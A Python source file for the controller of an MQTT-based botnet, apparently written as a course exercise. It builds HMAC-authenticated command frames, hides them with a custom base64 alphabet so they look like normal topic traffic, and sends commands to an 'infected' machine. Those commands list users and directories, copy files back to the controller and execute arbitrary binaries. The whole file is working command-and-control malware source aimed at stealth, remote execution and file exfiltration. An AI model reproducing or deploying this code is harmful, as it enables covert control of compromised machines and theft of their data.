import paho.mqtt.client as mqtt
import argparse
from globvars import ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES, CMD_TYPES, SALT, RESP_TYPES, DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC
from datetime import datetime, timedelta
import base64
import struct # for binary packing/unpacking
import zlib
import os
import random
from protocol import ProtocolHandler
import subprocess
import time
from bot import BotController 

# Argon2id is a blend of the previous two variants. Argon2id should be used by most users, as recommended in RFC 9106. ; taken from the docs
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from cryptography.hazmat.primitives import hashes, hmac 

# This is the only instance of the controller that the bot will listen to
# The bot can receive other commands from other services but it will ignore them
# if they do not show the correct authentication logic

''' 
The validation / authenticion logic has the following function:
   It is for the bot to decide with high confidence that the command is meant for it. 
   Bot must recognize commands only from the controller.
   The commands must be statistically indistinguishable from normal traffic in the topic (REQUIREMENT! STAY HIDDEN).
   Make sure that any accidental triggers are minimized. 

   Conceptual frame:
   | MAGIC | VERSION | TYPE | LENGTH | AUTH | PAYLOAD | CHECKSUM |
    - MAGIC: a predefined short sequence of bytes that indicates the start of a command
    - VERSION: a byte indicating the version of the protocol
    - TYPE: a byte indicating the type of command (e.g., announce, list-users, ...)
    - LENGTH: a short integer indicating the length of the PAYLOAD
    - AUTH: an authentication field (e.g., HMAC, signature)
    - PAYLOAD: the actual command data
    - CHECKSUM: a checksum for integrity verification 

    The bot will verify these leveles one by one and if one fails, it will discard the message.


    Authentication logic:
    - Command-bound MAC: AUTH = hash(secret_key =| payload) -> Payload can't be tampered with
    - The bot and controller share a secret key known only to them.

    Encoding:
    - Non-standard base64 alphabet
    - Padding with random bytes before and after the frame to blend with noise

'''

class AlphabetEncoder:
    def __init__(self, standard_alphabet: str=STANDARD_ALPHABET, custom_alphabet: str=CUSTOM_ALPHABET):
        self.standard_alphabet = standard_alphabet
        self.custom_alphabet = custom_alphabet
        self.encode_map = str.maketrans(standard_alphabet, custom_alphabet)
        self.decode_map = str.maketrans(custom_alphabet, standard_alphabet)

    def encode(self, data:bytes) -> str:
        std_encoded = base64.b64encode(data).decode()
        return std_encoded.translate(self.encode_map)

    def decode(self, data: str) -> str:
        # Translate back to standard alphabet
        standard_data = data.translate(self.decode_map)
        # Standard base64 decoding
        decoded_bytes = base64.b64decode(standard_data)
        return decoded_bytes.decode()

class Publisher():
    def __init__(self,
                 broker_address: str,
                 port: int,
                 topic: str, 
                 secret_key: str,
                 time_delta: float=1):
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2) 
        self.broker = broker_address
        self.port = port 
        self.topic = topic
        self.received_answer = False
        self.bot_master = BotController(secret_key=secret_key)
        self.ph = ProtocolHandler(secret=self.bot_master.secret)

        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.time_sent = 0
        self.time_delta = time_delta
    
    def _shutdown(self):
        try:
            self.client.loop_stop()
            self.client.disconnect()
        except Exception:
            pass
    
    def on_connect(self, client, userdata, flags, reason_code, properties):
        client.subscribe(self.topic)
    
    def send(self, payload: bytes):
        self.client.connect(self.broker, self.port)
        status = self.client.publish(self.topic, payload)
        self.time_sent = datetime.now()
        print(self.time_sent)
        if status.rc != mqtt.MQTT_ERR_SUCCESS:
            print(f"Could not publish the message: {status.rc}")
            self._shutdown()
            return
        else:
            print(f"Successfully published!")
        
        self.client.loop_forever()
        # self.client.loop_stop()
        # self.client.disconnect()
    
    def on_message(self, client, userdata, message):
        try:
            decoded_m = self.ph.decode_frame(message.payload)
            if self.ph.verify_frame_botmaster_side(decoded_m):
                print("Response verified!")
                magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
                print(f"Response: {cmd_type};\nPayload: {payload.decode()}")

                # disconnect
                self.client.loop_stop()
                self.client.disconnect()

        except Exception as e:
            pass


def main():
    parser = argparse.ArgumentParser(description="Bot Controller")
    #1. announcing the presence of the bot to the controller if asked.
    parser.add_argument("--announce", type=str, required=False)
    #2. listing users currently logged in the "infected" device (output of 'w' command).
    parser.add_argument("--list-users", action="store_true", required=False)
    #3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
    parser.add_argument("--list-dir", type=str, required=False)
    #4. id of the user running the bot (output of 'id command').
    parser.add_argument("--user-id", action="store_true", required=False, help ="Get the id of the currently logged in user.")
    parser.add_argument("--kill",action="store_true", required=False, help="Kill the bot.")
    #5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
    parser.add_argument("--copy-file", type=str, required=False, help="Copy the file specified by the path.")
    #6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
    parser.add_argument("--exec-binary", type=str, required=False)

    args = parser.parse_args()
    print("Parsed arguments:", args)

    # init bot master
    publisher = Publisher(DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC, ROOT_SECRET)

    cmd_type, payload = publisher.bot_master.command_to_type(args)
    frame = publisher.ph.build_frame(cmd_type, payload)
    encoded_frame = publisher.ph.encode_frame(frame)

    publisher.send(encoded_frame)


if __name__ == "__main__":
    main()
